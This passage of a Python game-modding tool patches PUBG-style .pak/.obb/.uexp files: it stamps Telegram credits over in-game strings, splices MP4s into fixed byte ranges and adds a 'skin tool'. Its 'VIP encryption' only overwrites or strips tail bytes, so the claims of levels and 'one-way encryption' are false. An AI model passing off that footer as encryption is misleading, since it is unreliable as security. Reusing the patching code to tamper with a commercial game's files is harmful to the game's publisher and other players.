        with open(dst_path, "r+b") as f:
            f.seek(0, 2)
            size = f.tell()
            f.seek(max(0, size - 45))
            f.write(b'\xDE\xAD\xBE\xEF' * 10)
        return True
    except Exception as e:
        console.print(f"[red]Error: {e}[/red]")
        return False

def decrypt_file(src_path, dst_path):
    """Attempt to decrypt a file"""
    try:
        with open(src_path, 'rb') as f:
            data = bytearray(f.read())
        
        file_size = len(data)
        
        # Check for custom encryption signature
        if file_size >= 41:
            last_41 = data[-41:]
            level = last_41[0]
            if 1 <= level <= 10:
                # Remove signature
                data_without_sig = data[:-41]
                with open(dst_path, 'wb') as f:
                    f.write(data_without_sig)
                console.print(f"[dim]  Custom encrypted file detected (level {level})[/dim]")
                return True
        
        # Check for normal encryption footer
        if file_size >= 45:
            last_45 = data[-45:]
            de_ad_be_ef = bytes([0xDE, 0xAD, 0xBE, 0xEF])
            if de_ad_be_ef in last_45:
                pattern_pos = last_45.find(de_ad_be_ef)
                if pattern_pos != -1:
                    data_without_footer = data[:-(45 - pattern_pos)]
                    with open(dst_path, 'wb') as f:
                        f.write(data_without_footer)
                    return True
        
        # If no signature found, just copy
        with open(dst_path, 'wb') as f:
            f.write(data)
        return True
        
    except Exception as e:
        console.print(f"[red]Decryption error: {e}[/red]")
        return False

def open_telegram_channel():
    """Open Telegram channel for encryption tool."""
    tg_link = "https://t.me/+YWda4I_zE4I3NmM1"
    try:
        if os.path.exists('/data/data/com.termux'):
            subprocess.run(['termux-open', tg_link])
        elif sys.platform == 'linux':
            subprocess.run(['xdg-open', tg_link])
        elif sys.platform == 'win32':
            subprocess.run(['start', tg_link], shell=True)
        else:
            console.print(f"\n[cyan]🔗 Open link: {tg_link}[/cyan]")
    except:
        console.print(f"\n[cyan]🔗 Link: {tg_link}[/cyan]")

def handle_encryption_tool():
    """VIP OBB/PAK Encryption Tool menu with custom encryption."""
    ensure_encryption_dirs()
    
    enc_base = BASE_DIR / 'ENCRYPTION'
    normal_input = enc_base / 'NORMAL_ENC' / 'INPUT'
    normal_output = enc_base / 'NORMAL_ENC' / 'OUTPUT'
    custom_input = enc_base / 'CUSTOM_ENC' / 'INPUT'
    custom_output = enc_base / 'CUSTOM_ENC' / 'OUTPUT'
    decrypt_input = enc_base / 'DECRYPT' / 'INPUT'
    decrypt_output = enc_base / 'DECRYPT' / 'OUTPUT'
    
    while True:
        show_banner()
        
        paths_info = f"[green]NORMAL ENC[/]: [cyan]{normal_input}[/]\n"
        paths_info += f"[green]CUSTOM ENC[/]: [cyan]{custom_input}[/]\n"
        paths_info += f"[green]DECRYPT[/]: [cyan]{decrypt_input}[/]"
        
        encryption_menu_panel = Panel(
            f'[bold cyan]🔐  Encrypt PAK Files[/bold cyan]\n[cyan]{"─" * 32}[/]\n\n{paths_info}\n\n[bold green][1][/bold green] NORMAL ENCRYPTION      [bold yellow]➛ Standard encryption[/bold yellow]\n[bold green][2][/bold green] CUSTOM ENCRYPTION      [bold yellow]➛ Custom level + key[/bold yellow]\n[bold green][3][/bold green] DECRYPT PAK            [bold yellow]➛ Decrypt MINI OBB/ZSDIC[/bold yellow]\n\n[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="cyan",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(encryption_menu_panel)
        console.print()
        
        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break
        
        if choice == "1":
            # NORMAL ENCRYPTION
            files = [f for f in normal_input.iterdir() if f.suffix.lower() in ('.pak', '.obb')]
            if not files:
                console.print(Panel(
                    '[bold red]❌ No .pak/.obb files in INPUT folder[/]',
                    border_style='red',
                    box=box.ROUNDED
                ))
            else:
                console.print(f"\n[cyan]📋 Files to encrypt:[/cyan]")
                for i, f in enumerate(files, 1):
                    console.print(f"   {i}. {f.name}")
                    success_count = 0
                    with Progress(BarColumn(), TextColumn("[progress.description]{task.description}"), TaskProgressColumn(), console=console) as progress:
                        task = progress.add_task("[cyan]Encrypting...", total=len(files))
                        for file in files:
                            dst = normal_output / file.name
                            if normal_encrypt_file(file, dst):
                                success_count += 1
                            progress.update(task, advance=1)
                    console.print(f"[green]✅ Encrypted {success_count}/{len(files)} files[/green]")
            input("\nPress Enter to continue...")
        
        elif choice == "2":
            # CUSTOM ENCRYPTION
            console.print(Panel.fit(
                "  ◈  CUSTOM ENCRYPTION V2  ◈  ",
                border_style="magenta",
                padding=(0, 2)
            ))
            
            # IMPORTANT WARNING
            console.print(Panel(
                "[bold yellow]⚠   IMPORTANT[/bold yellow]\n\n"
                "   Backup your ORIGINAL & MODIFIED PAK before proceeding.\n"
                "   Custom encrypted files CANNOT be decrypted back to original.\n"
                "   This is a ONE-WAY encryption!",
                border_style="red",
                padding=(1, 2)
            ))
            
            confirm = Prompt.ask("\n  [yellow]Understood — continue? (y/n)[/yellow]", choices=['y', 'n'], default='n')
            if confirm != 'y':
                input("\nPress Enter to continue...")
                continue
            
            # STEP 1: Encryption Level
            console.print("\n[bold cyan]──────────   STEP 1 of 2  —  Encryption Level   ───────────[/bold cyan]\n")
            
            # Show levels table
            level_table = Table(box=box.ROUNDED, border_style="yellow", header_style="bold yellow")
            level_table.add_column("Level", style="bold cyan", justify="center")
            level_table.add_column("Strength", style="white")
            level_table.add_column("Description", style="dim")
            
            for level, info in ENCRYPTION_LEVELS.items():
                level_table.add_row(f"  {level}   ", f"{info['bar']}", info['name'])
            
            console.print(Align.center(level_table))
            console.print()
            
            # Get level from user
            while True:
                try:
                    level = int(Prompt.ask("  [bold yellow]Enter level [1–10][/bold yellow]"))
                    if 1 <= level <= 10:
                        break
                    console.print("[red]❌ Please enter a number between 1 and 10[/red]")
                except ValueError:
                    console.print("[red]❌ Invalid input. Enter a number (1-10)[/red]")
            
            level_info = ENCRYPTION_LEVELS[level]
            console.print(f"\n  [cyan]{level_info['bar']}  Level {level} — {level_info['name']}[/cyan]")
            
            # STEP 2: Encryption Key
            console.print("\n[bold cyan]───────────   STEP 2 of 2  —  Encryption Key   ────────────[/bold cyan]\n")
            console.print("[dim]A custom key embeds your signature into the encrypted PAK tail.[/dim]")
            console.print("[dim]Skip to use random bytes instead.[/dim]\n")
            
            add_key = Prompt.ask("  [yellow]Add a custom key? (y/n)[/yellow]", choices=['y', 'n'], default='n')
            
            custom_key = None
            if add_key == 'y':
                while True:
                    custom_key = Prompt.ask("  [yellow]Enter key (max 20 characters)[/yellow]").strip()
                    if len(custom_key) <= 20 and custom_key:
                        break
                    console.print("[red]❌ Key must be 1-20 characters[/red]")
                
                # Show key with visual indicator
                key_display = "▮" * len(custom_key) + "▯" * (20 - len(custom_key))
                console.print(f"\n  [green]✔ Key set[/green]")
                console.print(f"  [cyan]{custom_key}[/cyan]")
                console.print(f"  [dim]{key_display}  {len(custom_key)}/20 chars[/dim]")
            
            # Show encryption config panel
            config_panel = Panel(
                f"[bold cyan]LEVEL[/bold cyan]                      {level}  {level_info['bar']}\n"
                f"[bold cyan]KEY[/bold cyan]                        {custom_key if custom_key else '(random bytes)'}\n"
                f"[bold cyan]STRENGTH[/bold cyan]                   {level_info['name']}",
                title="  ◈  ENCRYPTION CONFIG  ◈  ",
                border_style="magenta",
                padding=(1, 2)
            )
            console.print(config_panel)
            
            # Get files to encrypt
            files = [f for f in custom_input.iterdir() if f.suffix.lower() in ('.pak', '.obb')]
            
            if not files:
                console.print(Panel(
                    "[red]❌ No .pak/.obb files found in CUSTOM_ENC/INPUT folder![/red]",
                    border_style="red"
                ))
            else:
                # Show input files table
                file_table = Table(title="📥 INPUT PAK", box=box.ROUNDED, border_style="cyan", header_style="bold cyan")
                file_table.add_column("  #", style="bold yellow", justify="center")
                file_table.add_column("FILE", style="white")
                file_table.add_column("SIZE", style="dim")
                
                for i, file in enumerate(files, 1):
                    size_mb = file.stat().st_size / (1024 * 1024)
                    file_table.add_row(str(i), file.name, f"{size_mb:.2f} MB")
                
                console.print(file_table)
                
                confirm = Prompt.ask(f"\n  [yellow]Encrypt {len(files)} file(s) with level {level}? (y/n)[/yellow]", choices=['y', 'n'], default='y')
                if confirm == 'y':
                    custom_output.mkdir(parents=True, exist_ok=True)
                    success_count = 0
                    
                    with Progress(BarColumn(), TextColumn("[progress.description]{task.description}"), TaskProgressColumn(), console=console) as progress:
                        task = progress.add_task(f"[cyan]Encrypting (level {level})...", total=len(files))
                        for file in files:
                            dst = custom_output / file.name
                            if custom_encrypt_file(file, dst, level, custom_key):
                                success_count += 1
                            progress.update(task, advance=1)
                    
                    # Show results
                    if success_count == len(files):
                        console.print(Panel(
                            f"[bold green]✔ All {len(files)} file(s) encrypted successfully[/bold green]\n\n"
                            f"[cyan]Output saved to:[/cyan]\n{custom_output}",
                            border_style="green"
                        ))
                    else:
                        console.print(Panel(
                            f"[bold yellow]⚠ Encrypted {success_count}/{len(files)} files[/bold yellow]",
                            border_style="yellow"
                        ))
            
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            # DECRYPT
            files = [f for f in decrypt_input.iterdir() if f.suffix.lower() in ('.pak', '.obb')]
            if not files:
                console.print(Panel(
                    "[red]❌ No .pak/.obb files in DECRYPT/INPUT folder[/red]",
                    border_style="red"
                ))
            else:
                console.print(f"\n[cyan]📋 Files to decrypt:[/cyan]")
                for i, f in enumerate(files, 1):
                    console.print(f"   {i}. {f.name}")
                
                confirm = Prompt.ask(f"\n[yellow]Decrypt {len(files)} file(s)? (y/n)[/yellow]", choices=['y', 'n'], default='y')
                if confirm == 'y':
                    decrypt_output.mkdir(parents=True, exist_ok=True)
                    success_count = 0
                    with Progress(BarColumn(), TextColumn("[progress.description]{task.description}"), TaskProgressColumn(), console=console) as progress:
                        task = progress.add_task("[cyan]Decrypting...", total=len(files))
                        for file in files:
                            dst = decrypt_output / file.name
                            if decrypt_file(file, dst):
                                success_count += 1
                            progress.update(task, advance=1)
                    console.print(f"[green]✅ Decrypted {success_count}/{len(files)} files[/green]")
            input("\nPress Enter to continue...")
        
        elif choice == "0":
            break
        
        else:
            console.print(Panel(
                f"[bold red]  ✗  '{choice}' is not a valid option.[/bold red]",
                box=box.HEAVY_HEAD, border_style="red", padding=(0, 0),
            ))
            input("\nPress Enter to continue...")

# ==================== CREDIT TOOL FUNCTIONS ====================

# Video ranges for CREDIT tool
CREDIT_RANGES_HEX = [
    ("2092582B", "20B35405"),
    ("20B35406", "20D201EC"),
    ("20D201ED", "20F0ADCD"),
    ("20F0ADCE", "229C842E"),
    ("229C842F", "22F69DDE"),
    ("22F69DDF", "239623D7"),
]

def hex_to_int(h: str) -> int:
    try:
        return int(h, 16)
    except ValueError as e:
        raise ValueError(f"Invalid hex: {h}") from e

# ── Video Credit helpers ──────────────────────────────────────────────────────

def _credit_find_best_mp4(range_size: int, mp4_files):
    suitable = [(f, f.stat().st_size) for f in mp4_files if f.stat().st_size <= range_size]
    if not suitable:
        return None, 0
    return max(suitable, key=lambda x: x[1])

def _credit_show_patch_summary(summary):
    table = Table(title="[bold green]Patching Summary[/]", box=box.ROUNDED, border_style="green")
    table.add_column("Start (Hex)", style="cyan")
    table.add_column("End (Hex)", style="cyan")
    table.add_column("Range Size", justify="right", style="yellow")
    table.add_column("Selected MP4", style="magenta")
    table.add_column("MP4 Size", justify="right", style="yellow")
    table.add_column("Written", justify="right", style="green")
    for start, end, range_size, mp4_name, mp4_size, written in summary:
        table.add_row(f"0x{start:08X}", f"0x{end:08X}", f"{range_size}", mp4_name if mp4_name else "None", f"{mp4_size}", f"{written}")
    console.print(Align.center(table))

def _credit_show_extract_summary(summary):
    table = Table(title="[bold green]Extraction Summary[/]", box=box.ROUNDED, border_style="green")
    table.add_column("Start (Hex)", style="cyan")
    table.add_column("End (Hex)", style="cyan")
    table.add_column("Range Size", justify="right", style="yellow")
    table.add_column("Output File", style="magenta")
    table.add_column("Status", style="green")
    for start, end, range_size, output_file, status in summary:
        table.add_row(f"0x{start:08X}", f"0x{end:08X}", f"{range_size}", Path(output_file).name, status)
    console.print(Align.center(table))

def credit_show_video_menu():
    """Video Credit Tool — Patch & Extract mini_obb.pak"""
    video_dir = BASE_DIR / 'CREDIT' / 'video'
    pak_name = video_dir / "mini_obb.pak"
    patch_out_dir = video_dir / "output"
    patch_out_file = patch_out_dir / "mini_obb.pak"
    extract_out_dir = video_dir / "extracted"

    while True:
        show_banner()
        console.print(Panel(Align.center(Text("🎬 VIDEO CREDIT TOOL — PATCH & EXTRACT", style="bold white")), box=box.HEAVY_HEAD, border_style="cyan", padding=(0, 0)))
        table = Table(box=box.SIMPLE_HEAD, border_style="cyan", header_style="bold cyan", expand=False, padding=(0, 2))
        table.add_column("  #", style="bold yellow", justify="center", width=4)
        table.add_column("ACTION", style="bold white", width=34)
        table.add_row("1", "🎬  PATCH mini_obb.pak with MP4s")
        table.add_row("2", "📤  EXTRACT ranges to MP4s")
        table.add_row("3", "ℹ️   Show Ranges Info")
        table.add_row("", "")
        table.add_row("0", "🔙  BACK")
        console.print(Align.center(table))
        console.print()
        try:
            choice = Prompt.ask("[bold yellow]  ▶ Select[/bold yellow]", choices=["1", "2", "3", "0"], default="1", console=console)
        except KeyboardInterrupt:
            break
        if choice == "0":
            break

        if not pak_name.exists():
            console.print(Panel(f"[red]❌ mini_obb.pak not found![/red]\n[cyan]💡 Place in: {video_dir}[/cyan]", title="Error", border_style="red"))
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")
            continue

        pak_bytes = pak_name.read_bytes()
        file_size = len(pak_bytes)

        if choice == "1":
            # PATCH MODE
            mp4_files = list(video_dir.glob("*.mp4"))
            mp4_files = [f for f in mp4_files if f.name != "mini_obb.pak"]
            if not mp4_files:
                console.print(Panel("[red]❌ No MP4 files found in CREDIT/video/[/red]", title="Error", border_style="red"))
                Prompt.ask("[white]Press Enter...[/white]", console=console, default="")
                continue

            console.print(f"[green]✅ Found {len(mp4_files)} MP4 file(s)[/green]")
            patched_bytes = bytearray(pak_bytes)
            summary = []

            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
                task = progress.add_task("[cyan]Patching video ranges...", total=len(CREDIT_RANGES_HEX))
                for start_h, end_h in CREDIT_RANGES_HEX:
                    try:
                        start = hex_to_int(start_h)
                        end = hex_to_int(end_h)
                    except ValueError as e:
                        console.print(f"[yellow]⚠ {e}[/yellow]")
                        progress.update(task, advance=1)
                        continue
                    if start < 0 or end < 0 or start > end:
                        progress.update(task, advance=1)
                        continue
                    if start >= file_size:
                        progress.update(task, advance=1)
                        continue
                    if end >= file_size:
                        end = file_size - 1
                    range_size = end - start + 1
                    mp4_path, mp4_size = _credit_find_best_mp4(range_size, mp4_files)
                    if mp4_path is None:
                        console.print(f"[yellow]⚠ No suitable MP4 for range 0x{start:08X}-0x{end:08X}[/yellow]")
                        summary.append((start, end, range_size, "None", 0, 0))
                        progress.update(task, advance=1)
                        continue
                    mp4_bytes = mp4_path.read_bytes()
                    write_len = min(range_size, mp4_size)
                    patched_bytes[start:start + write_len] = mp4_bytes[:write_len]
                    summary.append((start, end, range_size, mp4_path.name, mp4_size, write_len))
                    console.print(f"[green]✓ Patched 0x{start:08X}-0x{end:08X} with {write_len} bytes from '{mp4_path.name}'[/green]")
                    progress.update(task, advance=1)

            patch_out_dir.mkdir(parents=True, exist_ok=True)
            patch_out_file.write_bytes(patched_bytes)
            console.print(Panel(
                f"[bold green]✅ Patched mini_obb.pak saved![/bold green]\n"
                f"[cyan]📁 Location: {patch_out_file}[/cyan]\n"
                f"[cyan]📏 Size: {patch_out_file.stat().st_size} bytes[/cyan]",
                title="Success", border_style="green"
            ))
            _credit_show_patch_summary(summary)
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")

        elif choice == "2":
            # EXTRACT MODE
            extract_out_dir.mkdir(parents=True, exist_ok=True)
            summary = []
            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
                task = progress.add_task("[cyan]Extracting video ranges...", total=len(CREDIT_RANGES_HEX))
                for start_h, end_h in CREDIT_RANGES_HEX:
                    try:
                        start = hex_to_int(start_h)
                        end = hex_to_int(end_h)
                    except ValueError as e:
                        console.print(f"[yellow]⚠ {e}[/yellow]")
                        progress.update(task, advance=1)
                        continue
                    if start < 0 or end < 0 or start > end:
                        progress.update(task, advance=1)
                        continue
                    if start >= file_size:
                        progress.update(task, advance=1)
                        continue
                    if end >= file_size:
                        end = file_size - 1
                    range_size = end - start + 1
                    output_file = extract_out_dir / f"extracted_0x{start_h}_0x{end_h}.mp4"
                    output_file.write_bytes(pak_bytes[start:end + 1])
                    summary.append((start, end, range_size, str(output_file), f"Extracted {range_size} bytes"))
                    console.print(f"[green]✓ Extracted 0x{start:08X}-0x{end:08X} → '{output_file.name}'[/green]")
                    progress.update(task, advance=1)
            console.print(Panel(
                f"[bold green]✅ Extraction complete![/bold green]\n[cyan]📁 Location: {extract_out_dir}[/cyan]",
                title="Success", border_style="green"
            ))
            _credit_show_extract_summary(summary)
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")

        elif choice == "3":
            # INFO MODE
            info_table = Table(title="[bold cyan]Video Ranges Information[/]", box=box.ROUNDED, border_style="cyan")
            info_table.add_column("#", style="bold yellow", justify="center", width=4)
            info_table.add_column("Start (Hex)", style="cyan")
            info_table.add_column("End (Hex)", style="cyan")
            info_table.add_column("Size (Bytes)", style="green", justify="right")
            for i, (start_h, end_h) in enumerate(CREDIT_RANGES_HEX, 1):
                start = hex_to_int(start_h)
                end = hex_to_int(end_h)
                size = end - start + 1
                info_table.add_row(str(i), f"0x{start:08X}", f"0x{end:08X}", f"{size:,}")
            console.print(Align.center(info_table))
            console.print(Panel(
                "[yellow]💡 INFO:[/yellow]\n"
                "• These ranges are where video data is stored in mini_obb.pak\n"
                "• You can replace them with your own MP4 files\n"
                "• MP4 must be smaller than or equal to range size\n"
                "• Place MP4 files in CREDIT/video/ folder",
                title="About Ranges", border_style="yellow"
            ))
            input("\nPress Enter to continue...")

# ── Text Credit Tool (NEW — length-aware, smart token selection) ──────────────

_CREDIT_ONEWORD = ""

_CREDIT_EXCEPTIONS = {
    "HTTP://", "HTTPS://", "UI/", "FX/", "DATA/", "ENGINE/", "TEXTURE/",
    "DEFAULT", "MATERIAL", "SHADER", "SKELETON", "SKELETALMESH",
    "Image_LQSG_LogoBG", "LQSG_Logo_01", "LGSG_Logt_03", "LGSG_UnrealSM",
    "Image_Pubg_Logobg", "TextBlock_2", "TextBlock_1", "Border_0",
    "Text007", "RenderTransform", "ColorAndOpacity", "ContentColorAndOpacity",
}

_CREDIT_HARDCODED = b"Match starts in <MatchStartInfo>{0}</> [/0:$(second|seconds)/]\x00"

_credit_hex_pattern = re.compile(r"^[0-9A-F]+$", re.IGNORECASE)
_credit_string_pattern = re.compile(rb"[\x20-\x7E]{5,}\x00")

def _credit_purge_output_dir(out_dir: Path):
    """Delete everything inside output dir before each run."""
    if out_dir.exists():
        for p in out_dir.iterdir():
            try:
                if p.is_file() or p.is_symlink():
                    p.unlink()
                elif p.is_dir():
                    shutil.rmtree(p)
            except Exception:
                pass
    out_dir.mkdir(parents=True, exist_ok=True)
    console.print(f"[cyan]🧹 Cleaned text credit output: {out_dir}[/cyan]")

def _credit_is_valid_string(s_bytes: bytes) -> bool:
    s_str = s_bytes.decode('ascii', errors='ignore')
    if ('/' in s_str or '\\' in s_str):
        if any(c in s_str[1:-1] for c in ['/', '\\']):
            return False
    if s_str in _CREDIT_EXCEPTIONS:
        return False
    if _credit_hex_pattern.fullmatch(s_str):
        return False
    return True

def _credit_to_caps(s: str) -> str:
    return re.sub(r"[^A-Z0-9@:\-_/ ]", "", s.upper())

def _credit_build_tokens(username: str, channel: str):
    global _CREDIT_ONEWORD
    username = _credit_to_caps(username)
    channel = _credit_to_caps(channel)
    oneword = _credit_to_caps(_CREDIT_ONEWORD)
    return [
        f"Made By:@{username}-TELEGRAM-{channel}",
        f"TG-{username}",
        f"TG-{channel}",
        f"MADEBY@{username}",
        f"{username}",
        f"{oneword}" if oneword else "",
    ]

def _credit_pick_longest_fitting(tokens, orig_len, use_channel_counter):
    """Choose the longest candidate whose length <= orig_len."""
    filtered = []
    for t in tokens:
        if t and len(t) <= orig_len:
            if t == tokens[-1] and tokens[-1]:  # oneword — use sparingly
                if use_channel_counter % 5 != 0:
                    continue
            filtered.append(t)
    if not filtered:
        return None
    return max(filtered, key=len)

def _credit_overwrite_hardcoded(modified_data: bytearray, data: bytes, username: str, channel: str, logs: list):
    """Replace the exact HARDCODED pattern with the long token."""
    idx = data.find(_CREDIT_HARDCODED)
    if idx == -1:
        return -1
    length = len(_CREDIT_HARDCODED) - 1
    replacement = f"Made By:@{username}-TELEGRAM-{channel}"
    rep = _credit_to_caps(replacement).encode('ascii', errors='ignore')
    if len(rep) > length:
        rep = rep[:length]
    pad = b"\x00" * (length - len(rep))
    modified_data[idx:idx + length] = rep + pad
    logs.append({
        "offset": idx,
        "original": _CREDIT_HARDCODED[:-1].decode('ascii', errors='ignore'),
        "replacement": _credit_to_caps(replacement),
    })
    return idx

def _credit_modify_file_in_place(path: Path, username: str, channel: str):
    tokens = _credit_build_tokens(username, channel)
    data = path.read_bytes()
    matches = list(_credit_string_pattern.finditer(data))
    modified = bytearray(data)
    logs = []

    hard_idx = _credit_overwrite_hardcoded(modified, data, username, channel, logs)

    use_channel_counter = 0
    for m in matches:
        start = m.start()
        if start == hard_idx:
            continue
        original_string = m.group(0)[:-1]
        orig_len = len(original_string)
        if orig_len < 6:
            continue
        if not _credit_is_valid_string(original_string):
            continue
        choice_token = _credit_pick_longest_fitting(tokens, orig_len, use_channel_counter)
        use_channel_counter += 1
        if choice_token is None:
            continue
        rep = _credit_to_caps(choice_token).encode('ascii', errors='ignore')
        if len(rep) > orig_len:
            rep = rep[:orig_len]
        pad = b"\x00" * (orig_len - len(rep))
        modified[start:start + orig_len] = rep + pad
        try:
            original_str = original_string.decode('ascii', errors='ignore')
        except Exception:
            original_str = "<binary>"
        logs.append({
            "offset": start,
            "original": original_str,
            "replacement": _credit_to_caps(choice_token),
        })

    if modified != data:
        path.write_bytes(modified)
    return logs

def _credit_unique_dest_path(dest_dir: Path, base_name: str) -> Path:
    candidate = dest_dir / base_name
    if not candidate.exists():
        return candidate
    stem = Path(base_name).stem
    suffix = Path(base_name).suffix
    i = 1
    while True:
        c = dest_dir / f"{stem}_{i}{suffix}"
        if not c.exists():
            return c
        i += 1

def _credit_process_text(username: str, channel: str):
    text_dir = BASE_DIR / 'CREDIT' / 'text'
    root = text_dir / 'ORG'
    out_dir = text_dir / 'output'
    _credit_purge_output_dir(out_dir)
    changelog = []

    if not root.exists():
        console.print(Panel(
            f"[red]❌ {root} not found![/red]\nPlease place .uexp files in: {root}",
            title="Error", border_style="red"
        ))
        return

    uexp_files = []
    for subdir, dirs, files in os.walk(root):
        if 'output' in dirs:
            dirs.remove('output')
        for fname in files:
            if fname.endswith('.uexp'):
                uexp_files.append(Path(subdir) / fname)

    if not uexp_files:
        console.print(Panel(f"[yellow]⚠ No .uexp files found in {root}[/yellow]", title="Warning", border_style="yellow"))
        return

    console.print(f"[green]✅ Found {len(uexp_files)} .uexp file(s)[/green]")

    with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), BarColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Processing text credit files...", total=len(uexp_files))
        for src in uexp_files:
            dst = _credit_unique_dest_path(out_dir, src.name)
            dst.write_bytes(src.read_bytes())
            logs = _credit_modify_file_in_place(dst, username, channel)
            if logs:
                changelog.append({"file": dst.name, "modifications": logs})
            else:
                if dst.exists():
                    dst.unlink()
            progress.update(task, advance=1)

    if changelog:
        from datetime import datetime as _dt
        clog = out_dir / "changelog.txt"
        with clog.open("w", encoding="utf-8") as f:
            f.write(f"Changelog generated on {_dt.now().isoformat()}\n\n")
            for entry in changelog:
                f.write(f"File: {entry['file']}\n")
                for mod in entry["modifications"]:
                    f.write(f"  @0x{mod['offset']:08X}: '{mod['original']}' -> '{mod['replacement']}'\n")
                f.write("\n")
        console.print(Panel(
            f"[bold green]✅ Text credit completed![/bold green]\n"
            f"[cyan]📁 Modified files: {out_dir}[/cyan]\n"
            f"[cyan]📄 Changelog: {clog}[/cyan]\n"
            f"[cyan]📊 Files modified: {len(changelog)}[/cyan]",
            title="Success", border_style="green"
        ))
    else:
        console.print(Panel(
            "[yellow]⚠ No modifications were made![/yellow]\n"
            "No suitable text patterns found in the .uexp files.",
            title="Info", border_style="yellow"
        ))

def credit_show_text_menu():
    """Smart Text Credit Tool (length-aware)"""
    text_dir = BASE_DIR / 'CREDIT' / 'text'
    org_dir = text_dir / 'ORG'

    while True:
        show_banner()
        console.print(Panel(Align.center(Text("📝 SMART TEXT CREDIT TOOL", style="bold white")), box=box.HEAVY_HEAD, border_style="magenta", padding=(0, 0)))

        table = Table(box=box.SIMPLE_HEAD, border_style="magenta", header_style="bold magenta", expand=False, padding=(0, 2))
        table.add_column("  #", style="bold yellow", justify="center", width=4)
        table.add_column("ACTION", style="bold white", width=40)
        table.add_row("1", "📝  REPLACE TEXT CREDIT (Smart)")
        table.add_row("2", "🔍  SCAN & PREVIEW")
        table.add_row("0", "🔙  BACK")
        console.print(Align.center(table))
        console.print()

        try:
            choice = Prompt.ask("[bold yellow]  ▶ Select[/bold yellow]", choices=["1", "2", "0"], console=console)
        except KeyboardInterrupt:
            break
        if choice == "0":
            break

        if not org_dir.exists() or not any(org_dir.rglob("*.uexp")):
            console.print(Panel(
                "[red]❌ No .uexp files found![/red]\n"
                f"[cyan]💡 Place files in: {org_dir}[/cyan]",
                title="Error", border_style="red"
            ))
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")
            continue

        if choice == "2":
            # SCAN MODE
            console.print("\n[cyan]🔍 Scanning files...[/cyan]")
            all_strings = set()
            for f in org_dir.rglob("*.uexp"):
                data = f.read_bytes()
                for m in _credit_string_pattern.finditer(data):
                    s_bytes = m.group(0)[:-1]
                    if 6 <= len(s_bytes) <= 80 and _credit_is_valid_string(s_bytes):
                        try:
                            all_strings.add(s_bytes.decode('ascii', errors='ignore'))
                        except Exception:
                            pass

            if not all_strings:
                console.print("[yellow]No replaceable text strings found![/yellow]")
            else:
                string_list = sorted(all_strings, key=len)
                console.print(Panel(f"[green]✅ Found {len(string_list)} replaceable strings[/green]", border_style="green"))
                preview = Table(box=box.ROUNDED, border_style="cyan", title="Sample Strings (First 20)")
                preview.add_column("#", style="dim")
                preview.add_column("String", style="cyan")
                preview.add_column("Length", style="yellow", justify="right")
                for idx, s in enumerate(string_list[:20], 1):
                    preview.add_row(str(idx), s[:50], str(len(s)))
                if len(string_list) > 20:
                    preview.add_row("...", f"... and {len(string_list) - 20} more", "")
                console.print(preview)
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")
            continue

        if choice == "1":
            # REPLACE MODE — smart, length-aware
            console.print(Panel(
                "[cyan]📝 TEXT CREDIT CONFIGURATION[/]\n"
                "Replaces text strings in .uexp files with your custom credits.\n"
                "Each string gets the longest token that fits its original length.",
                border_style="cyan"
            ))
            username = Prompt.ask("[yellow]📛 Enter USERNAME (used after @)[/yellow]", console=console).strip().upper()
            if not username:
                console.print("[red]❌ Username cannot be empty[/red]")
                continue
            channel = Prompt.ask("[yellow]📢 Enter CHANNEL NAME[/yellow]", console=console).strip().upper()
            if not channel:
                console.print("[red]❌ Channel name cannot be empty[/red]")
                continue
            global _CREDIT_ONEWORD
            _CREDIT_ONEWORD = Prompt.ask("[yellow]🔤 Enter SINGLE WORD tag (optional, no spaces)[/yellow]", default="", console=console).strip().upper()

            console.print(f"\n[cyan]📊 Summary:[/]")
            console.print(f"  • Username : [green]{username}[/green]")
            console.print(f"  • Channel  : [green]{channel}[/green]")
            console.print(f"  • OneWord  : [green]{_CREDIT_ONEWORD if _CREDIT_ONEWORD else '(none)'}[/green]")
            confirm = Prompt.ask("\n[bold yellow]Proceed with text credit modification? (y/n)[/]", choices=["y", "n"], default="y")
            if confirm != "y":
                console.print("[yellow]Cancelled.[/yellow]")
                continue

            _credit_process_text(username, channel)
            Prompt.ask("[white]Press Enter...[/white]", console=console, default="")

def handle_credit_tool():
    """Credit Tool — Main menu for video and text credit tools"""
    while True:
        show_banner()
        
        credit_menu_panel = Panel(
            f'[bold cyan]⭐  CREDIT TOOL[/bold cyan]\n[cyan]{"─" * 32}[/]\n[green]Powered by @Black_Toxic000[/]\n\n[bold green][1][/bold green] TEXT CREDIT TOOL        [bold yellow]➛ Smart replacement[/bold yellow]\n[bold green][2][/bold green] VIDEO CREDIT TOOL       [bold yellow]➛ Patch MP4 into mini_obb[/bold yellow]\n\n[bold red][0][/bold red] BACK TO MAIN MENU',
            border_style="magenta",
            padding=(1, 3),
            box=box.ROUNDED
        )
        console.print(credit_menu_panel)
        console.print()

        try:
            choice = Prompt.ask('[bold yellow]Select option [/bold yellow]', default='', show_default=False)
        except KeyboardInterrupt:
            break

        if choice == "0":
            break
        elif choice == "1":
            credit_show_text_menu()
        elif choice == "2":
            credit_show_video_menu()
        else:
            console.print(Panel(
                f'[bold red]❌ Option {choice} is invalid[/]',
                title='[bold red]Error[/]',
                border_style="red",
                padding=(1, 2),
                box=box.ROUNDED
            ))
            Prompt.ask(f'[dim]Press Enter to continue...[/dim]', default='')

# ==================== SKIN TOOL FUNCTIONS (INTEGRATED) ====================

import platform
import threading
import re as _re
import zipfile as _zipfile
import io as _io
import gzip as _gzip
from concurrent.futures import ThreadPoolExecutor as _ThreadPoolExecutor
from collections import defaultdict as _defaultdict

# Skin Tool Constants
MAGIC_NUMBER = b'\x28\xB5\x2F\xFD'
DICT_START_HEX = bytes.fromhex("37 A4 30 EC")
